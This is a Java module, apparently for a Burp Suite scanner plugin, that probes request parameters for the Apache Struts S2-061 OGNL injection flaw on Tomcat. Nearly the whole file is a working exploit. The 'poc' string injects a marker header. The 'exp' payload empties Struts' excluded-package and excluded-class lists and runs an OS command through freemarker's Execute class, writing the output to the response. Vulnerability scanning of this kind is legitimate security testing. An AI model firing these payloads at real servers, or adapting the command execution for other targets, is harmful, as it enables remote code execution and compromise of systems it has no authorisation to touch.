package module;

import burp.IModule;
import burp.IParameter;
import burp.IScanIssue;

import java.net.URLEncoder;
import java.util.List;

public class S2_061 extends IModule {
    public S2_061() {
        // https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g
        // https://mp.weixin.qq.com/s?__biz=MzU2NDgzOTQzNw==&mid=2247486019&idx=1&sn=d80d2f443bfd0219c9a8ed7ae5fb8887
        // only work in Tomcat
        poc =
            "%{" +
            "(#im=#application.get('org.apache.tomcat.InstanceManager'))" +
            ".(#map=#im.newInstance('org.apache.commons.collections.BeanMap'))" +
            ".(#map.setBean(#request.get('struts.valueStack')))" +
            ".(#f=#map.get('context')['com.opensymphony.xwork2.dispatcher.HttpServletResponse'])" +
            ".(#f.addHeader('poc','"+injectMark[0]+"'+'"+injectMark[1]+"'))" +
            "}";
        poc = URLEncoder.encode(poc);

        exp =
            "%{" +
            "(#im=#application.get('org.apache.tomcat.InstanceManager'))" +
            ".(#map=#im.newInstance('org.apache.commons.collections.BeanMap'))" +
            ".(#map.setBean(#request.get('struts.valueStack')))" +
            ".(#ct=#map.get('context'))" +
            ".(#map.setBean(#ct))" +
            ".(#map.setBean(#map.get('memberAccess')))" +
            ".(#map.put('excludedPackageNames',#im.newInstance('java.util.HashSet')))" +
            ".(#map.put('excludedClasses',#im.newInstance('java.util.HashSet')))" +
            ".(#r=#im.newInstance('freemarker.template.utility.Execute').exec({'whoami'}))" +
            ".(#f=#ct['com.opensymphony.xwork2.dispatcher.HttpServletResponse'])" +
            ".(#f.getWriter().print(#r))" +
            ".(#f.getWriter().flush())" +
            ".(#f.getWriter().close())" +
            "}";
        exp = URLEncoder.encode(exp);
    }

    @Override
    public IScanIssue start() {
        List<IParameter> parameters = requestInfo.getParameters();
        for (IParameter parameter: parameters) {
            if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                IParameter newParameter = helpers.buildParameter(parameter.getName(), poc, parameter.getType());
                request = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
                if (check()) {
                    this.detail = exp;
                    return creatCustomScanIssue();
                }
            }
        }
        return super.start();
    }
}
